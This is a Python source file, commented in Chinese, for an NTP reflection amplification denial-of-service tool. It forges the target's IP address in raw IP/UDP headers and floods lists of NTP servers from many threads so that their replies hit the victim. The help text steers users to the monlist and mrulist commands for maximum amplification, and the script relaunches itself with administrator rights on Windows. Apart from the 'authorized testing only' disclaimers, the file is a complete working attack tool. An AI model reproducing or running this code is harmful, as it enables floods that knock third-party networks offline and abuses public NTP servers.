#!/usr/bin/env python3
"""
NTP反射攻击测试工具 - 跨平台版本
支持Windows、Linux和macOS
注意：仅限授权测试使用
"""

import argparse
import random
import socket
import struct
import threading
import time
import sys
import os
import platform
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timedelta

# 导入NTP数据包定义
try:
    from ntp_packets import *
except ImportError:
    print("错误: 找不到 ntp_packets.py 文件")
    print("请确保 ntp_packets.py 与当前脚本在同一目录下")
    sys.exit(1)

def check_admin_privileges():
    """检查当前是否具有管理员/root权限"""
    system = platform.system()
    
    if system == "Windows":
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False
    elif system in ["Linux", "Darwin"]:
        return os.geteuid() == 0
    else:
        return False

def request_admin_privileges():
    """请求管理员/root权限（仅Windows）"""
    system = platform.system()
    
    if system == "Windows":
        try:
            import ctypes
            print("请求Windows管理员权限...")
            # 重新启动脚本并请求管理员权限
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
            return True
        except Exception as e:
            print(f"请求管理员权限失败: {e}")
            return False
    else:
        print("请在Linux/macOS上使用sudo运行此脚本")
        print(f"示例: sudo {sys.executable} {' '.join(sys.argv)}")
        return False

# 在脚本开始时检查权限
has_admin_privileges = check_admin_privileges()
if not has_admin_privileges:
    print("当前没有管理员权限，某些功能可能受限")
    if platform.system() == "Windows":
        # 在Windows上，尝试请求权限
        if request_admin_privileges():
            # 如果请求成功，当前进程会退出，新进程会启动
            sys.exit(0)
        else:
            print("将继续以普通权限运行")
    else:
        print("将继续以普通权限运行")

class PerformanceMonitor:
    """性能监控类"""
    def __init__(self):
        self.start_time = None
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.lock = threading.Lock()
        self.request_timestamps = []
        self.server_stats = {}  # 按服务器统计
        
    def start(self):
        """开始监控"""
        self.start_time = time.time()
        self.total_requests = 0
        self.successful_requests = 0
        self.failed_requests = 0
        self.request_timestamps = []
        self.server_stats = {}
        
    def record_request(self, server, success=True):
        """记录请求"""
        with self.lock:
            self.total_requests += 1
            if success:
                self.successful_requests += 1
            else:
                self.failed_requests += 1
            self.request_timestamps.append(time.time())
            
            # 记录服务器统计
            if server not in self.server_stats:
                self.server_stats[server] = {"total": 0, "success": 0, "failed": 0}
            
            self.server_stats[server]["total"] += 1
            if success:
                self.server_stats[server]["success"] += 1
            else:
                self.server_stats[server]["failed"] += 1
            
            # 保持最近1000个时间戳以避免内存过度使用
            if len(self.request_timestamps) > 1000:
                self.request_timestamps.pop(0)
    
    def get_stats(self):
        """获取统计信息"""
        with self.lock:
            elapsed = time.time() - self.start_time if self.start_time else 0
            if elapsed > 0:
                requests_per_sec = self.total_requests / elapsed
            else:
                requests_per_sec = 0
                
            # 计算最近10秒的请求率
            recent_rate = 0
            if self.request_timestamps:
                now = time.time()
                recent_requests = sum(1 for ts in self.request_timestamps if now - ts <= 10)
                recent_rate = recent_requests / 10.0 if recent_requests > 0 else 0
            
            # 计算服务器统计
            server_stats_summary = {}
            for server, stats in self.server_stats.items():
                server_stats_summary[server] = {
                    "total": stats["total"],
                    "success": stats["success"],
                    "failed": stats["failed"],
                    "success_rate": (stats["success"] / stats["total"] * 100) if stats["total"] > 0 else 0
                }
            
            return {
                "elapsed": elapsed,
                "total_requests": self.total_requests,
                "successful_requests": self.successful_requests,
                "failed_requests": self.failed_requests,
                "requests_per_sec": requests_per_sec,
                "recent_rate": recent_rate,
                "success_rate": (self.successful_requests / self.total_requests * 100) if self.total_requests > 0 else 0,
                "server_stats": server_stats_summary
            }
    
    def print_stats(self, detailed=False, verbose=False):
        """打印统计信息"""
        stats = self.get_stats()
        
        if detailed or verbose:
            print("\n" + "="*80)
            print("性能统计详情:")
            print("="*80)
            print(f"运行时间: {timedelta(seconds=int(stats['elapsed']))}")
            print(f"总请求数: {stats['total_requests']}")
            print(f"成功请求: {stats['successful_requests']}")
            print(f"失败请求: {stats['failed_requests']}")
            print(f"成功率: {stats['success_rate']:.2f}%")
            print(f"平均请求率: {stats['requests_per_sec']:.2f} 请求/秒")
            print(f"最近10秒请求率: {stats['recent_rate']:.2f} 请求/秒")
            
            if verbose and stats['server_stats']:
                print("\n服务器详细统计:")
                print("-" * 80)
                for server, s_stats in stats['server_stats'].items():
                    print(f"  {server}: 总请求={s_stats['total']}, 成功={s_stats['success']}, "
                          f"失败={s_stats['failed']}, 成功率={s_stats['success_rate']:.2f}%")
            
            print("="*80)
        else:
            print(f"[STATS] 运行: {timedelta(seconds=int(stats['elapsed']))} | "
                  f"总请求: {stats['total_requests']} | "
                  f"成功: {stats['successful_requests']} | "
                  f"失败: {stats['failed_requests']} | "
                  f"成功率: {stats['success_rate']:.2f}% | "
                  f"速率: {stats['requests_per_sec']:.2f} req/s | "
                  f"最近: {stats['recent_rate']:.2f} req/s")


class NTPReflector:
    def __init__(self, target, target_port, ntp_servers_file, 
                 threads=10, min_delay=0, max_delay=0, duration=0,
                 mode=3, command=None, version=4, test_before_attack=True,
                 stats_interval=5, verbose=False):
        # 解析目标地址（可以是域名或IP）
        self.target = target
        self.target_ip = self.resolve_target(target)
        self.target_port = target_port
        self.threads = threads
        self.min_delay = min_delay  # 毫秒
        self.max_delay = max_delay  # 毫秒
        self.duration = duration
        self.mode = mode
        self.command = command
        self.version = version
        self.test_before_attack = test_before_attack
        self.stats_interval = stats_interval
        self.verbose = verbose
        self.running = False
        self.monitor = PerformanceMonitor()
        self.last_stats_time = 0
        self.using_raw_socket = False
        
        # 读取NTP服务器列表
        self.ntp_servers = self.load_ntp_servers(ntp_servers_file)
        if not self.ntp_servers:
            print("错误: 没有可用的NTP服务器")
            sys.exit(1)
            
        print(f"已加载 {len(self.ntp_servers)} 个NTP服务器")
        
        # 测试NTP服务器支持的模式
        self.supported_servers = {}
        if self.test_before_attack:
            self.test_ntp_servers()
        else:
            # 如果不测试，假设所有服务器都支持选择的模式
            for server in self.ntp_servers:
                self.supported_servers[server] = True
        
    def resolve_target(self, target):
        """解析目标地址（域名或IP）"""
        try:
            # 尝试解析域名
            ip = socket.gethostbyname(target)
            print(f"解析目标 '{target}' -> {ip}")
            return ip
        except socket.gaierror:
            print(f"错误: 无法解析目标地址 '{target}'")
            sys.exit(1)
    
    def clean_path(self, path):
        """清理路径字符串，去除多余的引号和空格"""
        path = path.strip()
        # 去除两端的引号
        if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
            path = path[1:-1]
        return path
    
    def load_ntp_servers(self, filename):
        """从文件加载NTP服务器列表，并解析其中的域名"""
        servers = []
        try:
            # 清理文件路径
            filename = self.clean_path(filename)
            
            with open(filename, 'r', encoding='utf-8') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # 解析服务器地址（可能是域名）
                        try:
                            resolved_ip = socket.gethostbyname(line)
                            servers.append(resolved_ip)
                            if self.verbose:
                                print(f"解析NTP服务器 '{line}' -> {resolved_ip}")
                        except socket.gaierror:
                            print(f"警告: 无法解析NTP服务器 '{line}'，跳过")
            return servers
        except FileNotFoundError:
            print(f"错误: 文件 '{filename}' 不存在")
            print("请确保文件路径正确且文件存在")
            return []
        except Exception as e:
            print(f"读取文件时出错: {e}")
            return []
    
    def test_ntp_server(self, server):
        """测试NTP服务器支持的模式"""
        try:
            # 创建测试套接字
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(2)  # 2秒超时
            
            # 发送测试请求
            ntp_packet = get_ntp_packet(self.mode, self.command, self.version)
            sock.sendto(ntp_packet, (server, 123))
            
            # 尝试接收响应
            data, addr = sock.recvfrom(1024)
            if data:
                if self.verbose:
                    print(f"服务器 {server} 支持模式 {self.mode} ({get_mode_description(self.mode)})")
                    if self.mode == 6 and self.command:
                        print(f"  命令 {self.command} ({get_command_description(self.command)})")
                    print(f"  版本 {self.version} ({get_version_description(self.version)})")
                return True
                
        except socket.timeout:
            if self.verbose:
                print(f"服务器 {server} 不支持模式 {self.mode} (超时)")
        except Exception as e:
            if self.verbose:
                print(f"测试服务器 {server} 时出错: {e}")
        finally:
            sock.close()
        
        return False
    
    def test_ntp_servers(self):
        """测试所有NTP服务器支持的模式"""
        print("开始测试NTP服务器支持的模式...")
        
        supported_count = 0
        for server in self.ntp_servers:
            if self.test_ntp_server(server):
                self.supported_servers[server] = True
                supported_count += 1
            else:
                if self.verbose:
                    print(f"警告: 服务器 {server} 不支持模式 {self.mode}，将被忽略")
        
        print(f"测试完成: {supported_count}/{len(self.ntp_servers)} 个服务器支持模式 {self.mode}")
        
        if supported_count == 0:
            print("错误: 没有可用的NTP服务器支持所选模式")
            sys.exit(1)
    
    def create_raw_socket(self):
        """跨平台创建原始套接字"""
        system = platform.system()
        
        try:
            if system == "Windows":
                # Windows平台
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                # 设置IP头包含选项
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                return sock, True
                
            elif system in ["Linux", "Darwin"]:
                # Unix-like平台
                # 尝试创建原始套接字
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                # 设置IP头包含选项
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                return sock, True
                
        except (OSError, AttributeError) as e:
            if self.verbose:
                print(f"无法创建原始套接字: {e}")
            # 回退到普通UDP套接字
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                return sock, False
            except Exception as e:
                if self.verbose:
                    print(f"也无法创建普通UDP套接字: {e}")
                return None, False
                
        return None, False
    
    def create_ip_header(self, source_ip, dest_ip):
        """创建IP头部"""
        # IP版本和头部长度
        ip_ver_ihl = 0x45  # IPv4, 头部长度5字(20字节)
        
        # 服务类型
        ip_tos = 0
        
        # 总长度 (稍后计算)
        ip_tot_len = 0
        
        # 标识
        ip_id = random.randint(0, 65535)
        
        # 分片偏移
        ip_frag_off = 0
        
        # 生存时间
        ip_ttl = 255
        
        # 协议 (UDP)
        ip_proto = socket.IPPROTO_UDP
        
        # 校验和 (初始为0)
        ip_check = 0
        
        # 源地址和目的地址
        ip_saddr = socket.inet_aton(source_ip)
        ip_daddr = socket.inet_aton(dest_ip)
        
        # 构建IP头部
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               ip_ver_ihl, ip_tos, ip_tot_len, ip_id, ip_frag_off,
                               ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
        
        return ip_header
    
    def create_udp_header(self, source_port, dest_port, data_length):
        """创建UDP头部"""
        # UDP长度 = UDP头长度(8字节) + 数据长度
        udp_length = 8 + data_length
        
        # 校验和 (初始为0)
        udp_check = 0
        
        # 构建UDP头部
        udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_check)
        
        return udp_header
    
    def send_ntp_request(self, ntp_server):
        """向NTP服务器发送伪造源IP的请求"""
        try:
            # 检查服务器是否支持所选模式
            if self.test_before_attack and ntp_server not in self.supported_servers:
                return False
                
            # 创建NTP数据包
            ntp_packet = get_ntp_packet(self.mode, self.command, self.version)
            
            # 尝试使用原始套接字
            sock, using_raw = self.create_raw_socket()
            
            if sock is None:
                return False
                
            if not using_raw:
                # 使用普通UDP套接字
                if not hasattr(self, '_raw_socket_warning_printed'):
                    print("警告: 无法创建原始套接字，使用普通UDP套接字（无法伪造源IP）")
                    self._raw_socket_warning_printed = True
                
                # 绑定到任意可用端口
                sock.bind(('0.0.0.0', 0))
                
                # 发送NTP请求
                sock.sendto(ntp_packet, (ntp_server, 123))
                sock.close()
                return True
            
            # 使用原始套接字伪造源IP
            try:
                # 构建IP头部
                ip_header = self.create_ip_header(self.target_ip, ntp_server)
                
                # 构建UDP头部
                udp_header = self.create_udp_header(self.target_port, 123, len(ntp_packet))
                
                # 组合数据包
                packet = ip_header + udp_header + ntp_packet
                
                # 发送数据包
                sock.sendto(packet, (ntp_server, 0))
                sock.close()
                self.using_raw_socket = True
                return True
                
            except Exception as e:
                if self.verbose:
                    print(f"使用原始套接字发送到 {ntp_server} 时出错: {e}")
                sock.close()
                return False
                
        except Exception as e:
            if self.verbose:
                print(f"发送到 {ntp_server} 时出错: {e}")
            return False
    
    def stats_thread(self):
        """统计信息输出线程"""
        while self.running:
            # 检查是否达到持续时间
            if self.duration > 0 and time.time() - self.monitor.start_time > self.duration:
                break
                
            # 定期打印统计信息
            time.sleep(self.stats_interval)
            if self.running:  # 再次检查是否仍在运行
                self.monitor.print_stats(verbose=self.verbose)
    
    def attack(self):
        """执行攻击的线程函数"""
        # 获取支持的服务器列表
        if self.test_before_attack:
            supported_servers = list(self.supported_servers.keys())
        else:
            supported_servers = self.ntp_servers
            
        if not supported_servers:
            print("错误: 没有可用的NTP服务器支持所选模式")
            return
            
        while self.running:
            # 检查是否达到持续时间
            if self.duration > 0 and time.time() - self.monitor.start_time > self.duration:
                break
                
            # 随机选择一个支持的NTP服务器
            ntp_server = random.choice(supported_servers)
            
            # 发送请求
            success = self.send_ntp_request(ntp_server)
            self.monitor.record_request(ntp_server, success)
            
            # 随机延迟 (毫秒转换为秒)
            if self.max_delay > 0:
                delay_ms = random.randint(self.min_delay, self.max_delay)
                time.sleep(delay_ms / 1000.0)
    
    def start(self):
        """启动攻击"""
        print(f"开始NTP反射攻击测试...")
        print(f"目标: {self.target} -> {self.target_ip}:{self.target_port}")
        print(f"线程数: {self.threads}")
        print(f"模式: {self.mode} ({get_mode_description(self.mode)})")
        if self.mode == 6 and self.command:
            print(f"命令: {self.command} ({get_command_description(self.command)})")
        print(f"版本: {self.version} ({get_version_description(self.version)})")
        if self.test_before_attack:
            print(f"有效的NTP服务器: {len(self.supported_servers)}/{len(self.ntp_servers)}")
        else:
            print(f"NTP服务器总数: {len(self.ntp_servers)}")
        print(f"延迟范围: {self.min_delay}-{self.max_delay}毫秒")
        print(f"持续时间: {self.duration}秒" if self.duration > 0 else "持续时间: 无限")
        print(f"统计间隔: {self.stats_interval}秒")
        print(f"详细模式: {'是' if self.verbose else '否'}")
        print(f"管理员权限: {'是' if has_admin_privileges else '否'}")
        print(f"使用原始套接字: {'是' if self.using_raw_socket else '否'}")
        print("按Ctrl+C停止攻击")
        
        self.running = True
        self.monitor.start()
        
        try:
            # 启动统计线程
            stats_thread = threading.Thread(target=self.stats_thread)
            stats_thread.daemon = True
            stats_thread.start()
            
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                # 启动所有线程
                futures = [executor.submit(self.attack) for _ in range(self.threads)]
                
                # 等待所有线程完成或用户中断
                for future in futures:
                    try:
                        future.result()
                    except Exception as e:
                        print(f"线程错误: {e}")
                        
        except KeyboardInterrupt:
            print("\n正在停止攻击...")
        finally:
            self.running = False
            print("攻击已停止")
            # 打印最终统计信息
            self.monitor.print_stats(detailed=True, verbose=self.verbose)

def get_input(prompt, default=None, required=True):
    """获取用户输入，支持默认值"""
    while True:
        if default:
            user_input = input(f"{prompt} [{default}]: ").strip()
        else:
            user_input = input(f"{prompt}: ").strip()
            
        if user_input:
            return user_input
        elif default and not required:
            return default
        elif default and required:
            return default
        else:
            print("此项为必填项，请重新输入")

def clean_path(path):
    """清理路径字符串，去除多余的引号和空格"""
    path = path.strip()
    # 去除两端的引号
    if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
        path = path[1:-1]
    return path

def validate_file(filename):
    """验证文件是否存在"""
    filename = clean_path(filename)
    if not os.path.isfile(filename):
        print(f"错误: 文件 '{filename}' 不存在")
        return False
    return True

def validate_port(port):
    """验证端口号是否有效"""
    try:
        port = int(port)
        if 1 <= port <= 65535:
            return port
        else:
            print("错误: 端口号必须在1-65535之间")
            return None
    except ValueError:
        print("错误: 端口号必须是整数")
        return None

def validate_number(value, min_val=0, max_val=None, value_type=int):
    """验证数字是否有效"""
    try:
        num = value_type(value)
        if min_val is not None and num < min_val:
            print(f"错误: 值必须大于或等于 {min_val}")
            return None
        if max_val is not None and num > max_val:
            print(f"错误: 值必须小于或等于 {max_val}")
            return None
        return num
    except ValueError:
        print(f"错误: 请输入有效的{value_type.__name__}值")
        return None

def validate_mode(mode):
    """验证模式是否有效"""
    try:
        mode = int(mode)
        if 1 <= mode <= 7:
            return mode
        else:
            print("错误: 模式必须在1-7之间")
            return None
    except ValueError:
        print("错误: 模式必须是整数")
        return None

def validate_command(command):
    """验证命令是否有效"""
    try:
        command = int(command)
        if (1 <= command <= 43) or (128 <= command <= 141):
            return command
        else:
            print("错误: 命令必须在1-43或128-141之间")
            return None
    except ValueError:
        print("错误: 命令必须是整数")
        return None

def validate_version(version):
    """验证版本是否有效"""
    try:
        version = int(version)
        if 1 <= version <= 4:
            return version
        else:
            print("错误: 版本必须在1-4之间")
            return None
    except ValueError:
        print("错误: 版本必须是整数")
        return None

def validate_boolean(value):
    """验证布尔值是否有效"""
    if value.lower() in ["true", "yes", "y", "1"]:
        return True
    elif value.lower() in ["false", "no", "n", "0"]:
        return False
    else:
        print("错误: 请输入有效的布尔值 (true/false, yes/no, y/n, 1/0)")
        return None

def print_help():
    """打印帮助信息"""
    print("""
NTP反射攻击测试工具 - 多协议支持版本

用法:
  python ntp_reflector.py [选项]

选项:
  --target TARGET        目标服务器IP地址或域名 (必需)
  -p PORT, --port PORT   目标端口 (默认: 123)
  -f FILE, --file FILE   NTP服务器列表文件 (必需)
  -t THREADS, --threads THREADS
                         并发线程数 (默认: 10)
  --min-delay MS         最小延迟(毫秒) (默认: 0)
  --max-delay MS         最大延迟(毫秒) (默认: 0)
  -d DURATION, --duration DURATION
                         攻击持续时间(秒) (默认: 0, 持续直到手动停止)
  -m MODE, --mode MODE   NTP模式 (1-7) (默认: 3)
  -c COMMAND, --command COMMAND
                         NTP控制消息命令 (仅模式6有效)
                         (1-43, 128-141, 常用: 42=MON_GETLIST, 43=MRU_GETLIST)
  -v VERSION, --version VERSION
                         NTP版本 (1-4) (默认: 4)
                         1: NTPv1, 2: NTPv2, 3: NTPv3, 4: NTPv4
  --test-before-attack TEST
                         攻击前测试NTP服务器支持的模式 (默认: true)
  --stats-interval SEC   统计信息输出间隔(秒) (默认: 5)
  --verbose, -v          详细输出模式 (默认: false)
  -h, --help             显示此帮助信息

支持的NTP模式及其原理:

模式1: SYMMETRIC_ACTIVE (对称主动)
  - 原理: 用于对等体之间的时间同步，客户端主动向对等体发送请求
  - 反射潜力: 中等，响应通常包含完整的时间信息
  - 适用版本: NTPv1-v4

模式2: SYMMETRIC_PASSIVE (对称被动)
  - 原理: 响应对称主动模式的请求，用于对等体间时间同步
  - 反射潜力: 中等，响应包含时间同步数据
  - 适用版本: NTPv1-v4

模式3: CLIENT (客户端)
  - 极简模式: 仅发送基本时间请求
  - 反射潜力: 低，响应通常较小
  - 适用版本: NTPv1-v4, SNTP

模式4: SERVER (服务器)
  - 响应模式: 用于响应客户端请求
  - 反射潜力: 低到中等，取决于服务器配置
  - 适用版本: NTPv1-v4

模式5: BROADCAST (广播)
  - 广播模式: 服务器定期向网络广播时间信息
  - 反射潜力: 低，通常不用于反射攻击
  - 适用版本: NTPv1-v4

模式6: NTP_CONTROL (控制消息) - 最高反射潜力
  - 管理接口: 用于监控和管理NTP服务器
  - 子命令:
    * 42: MON_GETLIST (monlist) - 查询最近与服务器通信的客户端列表
      - 反射潜力: 非常高，响应可能包含数百个客户端信息
      - 响应大小: 可达数百KB
    * 43: MRU_GETLIST (mrulist) - 查询最近使用过的客户端列表
      - 反射潜力: 高，响应通常较大
      - 响应大小: 可达数十KB
    * 其他命令 (1-41, 128-141): 各种监控和管理命令
      - 反射潜力: 可变，取决于具体命令和服务器配置
  - 适用版本: NTPv2-v4

模式7: PRIVATE (私有)
  - 厂商扩展: 厂商特定的私有协议扩展
  - 反射潜力: 可变，取决于具体实现
  - 适用版本: 厂商特定

NTP版本支持:
  - NTPv1: 最古老的版本，支持基本时间同步功能
  - NTPv2: 增加了控制消息功能，是反射攻击的主要目标
  - NTPv3: 改进了算法和安全性，仍然广泛使用
  - NTPv4: 最新版本，支持更大的时间范围和改进的算法

性能监控:
  - 实时显示请求统计信息
  - 包括总请求数、成功/失败计数、请求率和成功率
  - 显示最近10秒的请求率
  - 详细模式 (-v) 下显示每个服务器的详细统计信息
  - 攻击结束后显示详细统计信息

注意事项:
  1. 伪造源IP需要原始套接字权限，在Windows上可能需要管理员权限
  2. 如果没有原始套接字权限，脚本将回退到普通UDP套接字，但无法伪造源IP
  3. 某些网络设备可能会阻止或过滤伪造源IP的数据包
  4. 此工具仅用于授权的安全测试目的

示例:
  # 使用MON_GETLIST命令进行高放大反射测试
  python ntp_reflector.py --target example.com -f ntp_servers.txt -m 6 -c 42

  # 使用MRU_GETLIST命令进行反射测试
  python ntp_reflector.py --target example.com -f ntp_servers.txt -m 6 -c 43

  # 使用标准客户端模式进行基础测试
  python ntp_reflector.py --target 192.168.1.100 -f servers.txt -m 3 -t 20 -d 60

  # 使用NTPv3和控制消息命令8 (READ_PEERS)
  python ntp_reflector.py --target test.com -f ntp.txt -m 6 -c 8 -v 3

  # 使用详细输出模式
  python ntp_reflector.py --target test.com -f ntp.txt --verbose

重要注意事项:
  1. 此工具仅用于授权的安全测试目的
  2. 使用前请确保您有权限测试目标服务器
  3. 不同NTP服务器可能支持不同的模式和命令
  4. 现代NTP服务器通常禁用或限制MON_GETLIST和MRU_GETLIST功能
  5. 反射攻击可能对网络造成严重影响，请谨慎使用
  6. 建议使用--test-before-attack参数先测试服务器支持的模式
  7. 不同版本的NTP协议可能有不同的数据包格式和行为

法律和道德声明:
  使用此工具进行未经授权的测试可能违反当地法律和网络使用政策。
  请确保您已获得所有必要的授权和许可，并遵守适用的法律法规。
    """)

def main():
    # 检查权限并显示状态
    print(f"当前权限状态: {'管理员' if has_admin_privileges else '普通用户'}")
    
    # 解析命令行参数
    parser = argparse.ArgumentParser(description="NTP反射攻击测试工具", add_help=False)
    parser.add_argument("--target", help="目标服务器IP地址或域名")
    parser.add_argument("-p", "--port", type=int, help="目标端口 (默认: 123)")
    parser.add_argument("-f", "--file", help="NTP服务器列表文件")
    parser.add_argument("-t", "--threads", type=int, help="并发线程数 (默认: 10)")
    parser.add_argument("--min-delay", type=int, help="最小延迟(毫秒) (默认: 0)")
    parser.add_argument("--max-delay", type=int, help="最大延迟(毫秒) (默认: 0)")
    parser.add_argument("-d", "--duration", type=int, help="攻击持续时间(秒) (默认: 0, 持续直到手动停止)")
    parser.add_argument("-m", "--mode", type=int, help="NTP模式 (1-7) (默认: 3)")
    parser.add_argument("-c", "--command", type=int, help="NTP控制消息命令 (仅模式6有效)")
    parser.add_argument("-v", "--version", type=int, help="NTP版本 (1-4) (默认: 4)")
    parser.add_argument("--test-before-attack", help="攻击前测试NTP服务器支持的模式 (默认: true)")
    parser.add_argument("--stats-interval", type=int, help="统计信息输出间隔(秒) (默认: 5)")
    parser.add_argument("--verbose", action="store_true", help="详细输出模式")
    parser.add_argument("-h", "--help", action="store_true", help="显示帮助信息")
    
    args = parser.parse_args()
    
    # 显示帮助信息
    if args.help:
        print_help()
        sys.exit(0)
    
    # 交互式输入缺失的参数
    if not args.target:
        args.target = get_input("请输入目标服务器IP地址或域名", required=True)
    
    if not args.file:
        while True:
            file_path = get_input("请输入NTP服务器列表文件路径", required=True)
            file_path = clean_path(file_path)
            if validate_file(file_path):
                args.file = file_path
                break
    else:
        args.file = clean_path(args.file)
        if not validate_file(args.file):
            # 文件不存在，要求重新输入
            while True:
                file_path = get_input("请输入NTP服务器列表文件路径", required=True)
                file_path = clean_path(file_path)
                if validate_file(file_path):
                    args.file = file_path
                    break
    
    if not args.port:
        while True:
            port_input = get_input("请输入目标端口", "123", required=False)
            port = validate_port(port_input)
            if port is not None:
                args.port = port
                break
    else:
        port = validate_port(args.port)
        if port is None:
            sys.exit(1)
        args.port = port
    
    if not args.threads:
        while True:
            threads_input = get_input("请输入并发线程数", "10", required=False)
            threads = validate_number(threads_input, min_val=1, value_type=int)
            if threads is not None:
                args.threads = threads
                break
    else:
        threads = validate_number(args.threads, min_val=1, value_type=int)
        if threads is None:
            sys.exit(1)
        args.threads = threads
    
    if not args.min_delay:
        while True:
            min_delay_input = get_input("请输入最小延迟(毫秒)", "0", required=False)
            min_delay = validate_number(min_delay_input, min_val=0, value_type=int)
            if min_delay is not None:
                args.min_delay = min_delay
                break
    else:
        min_delay = validate_number(args.min_delay, min_val=0, value_type=int)
        if min_delay is None:
            sys.exit(1)
        args.min_delay = min_delay
    
    if not args.max_delay:
        while True:
            max_delay_input = get_input("请输入最大延迟(毫秒)", "0", required=False)
            max_delay = validate_number(max_delay_input, min_val=0, value_type=int)
            if max_delay is not None:
                args.max_delay = max_delay
                break
    else:
        max_delay = validate_number(args.max_delay, min_val=0, value_type=int)
        if max_delay is None:
            sys.exit(1)
        args.max_delay = max_delay
    
    # 验证最大延迟不小于最小延迟
    if args.max_delay < args.min_delay:
        print("错误: 最大延迟不能小于最小延迟")
        sys.exit(1)
    
    if not args.duration:
        while True:
            duration_input = get_input("请输入攻击持续时间(秒，0表示无限)", "0", required=False)
            duration = validate_number(duration_input, min_val=0, value_type=int)
            if duration is not None:
                args.duration = duration
                break
    else:
        duration = validate_number(args.duration, min_val=0, value_type=int)
        if duration is None:
            sys.exit(1)
        args.duration = duration
    
    if not args.mode:
        while True:
            mode_input = get_input("请输入NTP模式 (1-7)", "3", required=False)
            mode = validate_mode(mode_input)
            if mode is not None:
                args.mode = mode
                break
    else:
        mode = validate_mode(args.mode)
        if mode is None:
            sys.exit(1)
        args.mode = mode
    
    # 如果模式是6 (控制消息)，询问命令
    if args.mode == 6 and not args.command:
        while True:
            command_input = get_input("请输入NTP控制消息命令", "42", required=False)
            command = validate_command(command_input)
            if command is not None:
                args.command = command
                break
    elif args.mode != 6 and args.command:
        print("警告: 命令参数仅对模式6有效，将被忽略")
        args.command = None
    else:
        if args.command:
            command = validate_command(args.command)
            if command is None:
                sys.exit(1)
            args.command = command
    
    if not args.version:
        while True:
            version_input = get_input("请输入NTP版本 (1-4)", "4", required=False)
            version = validate_version(version_input)
            if version is not None:
                args.version = version
                break
    else:
        version = validate_version(args.version)
        if version is None:
            sys.exit(1)
        args.version = version
    
    if not args.test_before_attack:
        while True:
            test_input = get_input("是否在攻击前测试NTP服务器支持的模式? (true/false)", "true", required=False)
            test_before_attack = validate_boolean(test_input)
            if test_before_attack is not None:
                args.test_before_attack = test_before_attack
                break
    else:
        test_before_attack = validate_boolean(args.test_before_attack)
        if test_before_attack is None:
            sys.exit(1)
        args.test_before_attack = test_before_attack
    
    if not args.stats_interval:
        while True:
            stats_interval_input = get_input("请输入统计信息输出间隔(秒)", "5", required=False)
            stats_interval = validate_number(stats_interval_input, min_val=1, value_type=int)
            if stats_interval is not None:
                args.stats_interval = stats_interval
                break
    else:
        stats_interval = validate_number(args.stats_interval, min_val=1, value_type=int)
        if stats_interval is None:
            sys.exit(1)
        args.stats_interval = stats_interval
    
    # 显示配置摘要
    print("\n配置摘要:")
    print(f"目标: {args.target}:{args.port}")
    print(f"NTP服务器列表: {args.file}")
    print(f"线程数: {args.threads}")
    print(f"模式: {args.mode} ({get_mode_description(args.mode)})")
    if args.mode == 6 and args.command:
        print(f"命令: {args.command} ({get_command_description(args.command)})")
    print(f"版本: {args.version} ({get_version_description(args.version)})")
    print(f"延迟范围: {args.min_delay}-{args.max_delay}毫秒")
    print(f"持续时间: {args.duration}秒" if args.duration > 0 else "持续时间: 无限")
    print(f"攻击前测试: {'是' if args.test_before_attack else '否'}")
    print(f"统计间隔: {args.stats_interval}秒")
    print(f"详细模式: {'是' if args.verbose else '否'}")
    
    # 确认开始
    confirm = input("\n确认开始? (y/N): ").strip().lower()
    if confirm != 'y':
        print("已取消")
        sys.exit(0)
    
    # 创建反射器实例
    reflector = NTPReflector(
        args.target, 
        args.port, 
        args.file, 
        args.threads, 
        args.min_delay, 
        args.max_delay, 
        args.duration,
        args.mode,
        args.command,
        args.version,
        args.test_before_attack,
        args.stats_interval,
        args.verbose
    )
    
    # 启动攻击
    reflector.start()

if __name__ == "__main__":
    main()